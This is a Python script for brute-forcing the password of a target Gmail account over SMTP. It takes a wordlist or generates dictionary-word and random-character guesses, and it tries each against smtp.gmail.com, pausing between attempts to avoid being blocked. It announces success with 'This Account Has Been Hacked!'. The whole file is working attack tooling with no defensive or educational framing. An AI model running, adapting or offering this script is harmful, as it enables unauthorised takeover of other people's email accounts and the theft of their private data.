#!/usr/bin/python

import smtplib
import ssl
import string
import random
import time
import nltk
from nltk.corpus import words

# Global set to keep track of used English words
used_words = set()

def main():
    target_email = input('Enter target email: ')
    file_path = input('Enter the path of passwords file (leave empty to generate passwords): ')

    if file_path:
        pass_list = load_passwords(file_path)
    else:
        print("No password file provided.")
        option = input("Do you want to generate passwords? (y/n): ").lower()
        if option == 'y':
            pass_list = None  # Set pass_list to None to indicate password generation on-the-fly
        else:
            print("Exiting program.")
            return

    brute_force_attack(target_email, pass_list)

def load_passwords(file_path):
    try:
        with open(file_path, 'r') as pass_file:
            return [password.strip() for password in pass_file.readlines()]
    except FileNotFoundError:
        print("Error: Passwords file not found.")
        return []

def generate_common_password():
    global used_words
    # Get a list of English words
    english_words = words.words()

    # Choose a random word that has not been used before
    word = random.choice(english_words)
    while word in used_words:
        word = random.choice(english_words)
    used_words.add(word)

    # Return the word with a random suffix
    return word

def generate_uncommon_password():
    # Generate an uncommon password using random combinations of characters
    all_chars = string.ascii_letters + string.digits + string.punctuation
    password = ''
    for _ in range(random.randint(8, 16)):
        password += random.choice(all_chars)
    return password

def alternating_password_generator():
    # Generate passwords in an alternating manner between common and uncommon
    while True:
        yield generate_common_password()
        yield generate_uncommon_password()

def brute_force_attack(target_email, pass_list):
    # Configure SSL context
    context = ssl.create_default_context()

    # Define a function for login attempt
    def login_attempt(password):
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
                server.login(target_email, password)
                return password
        except smtplib.SMTPAuthenticationError:
            return None
        except Exception as e:
            print(f'An error occurred while connecting to the SMTP server: {e}')
            return None

    # Perform brute-force attack
    password_generator = alternating_password_generator()
    while True:
        if pass_list is None:
            password = next(password_generator)
        elif pass_list:
            password = pass_list.pop(0)
        else:
            print('Password list exhausted. Exiting program.')
            return

        print(f'Trying password: {password}')
        result = login_attempt(password)
        if result:
            print('[+] This Account Has Been Hacked! Password:', password)
            return
        else:
            print('[!] Password not found =>', password)

        # Wait before trying the next password to avoid being blocked
        time.sleep(2)

if __name__ == "__main__":
    # Download NLTK words corpus if not already downloaded
    try:
        nltk.data.find('corpora/words')
    except LookupError:
        nltk.download('words')
    main()
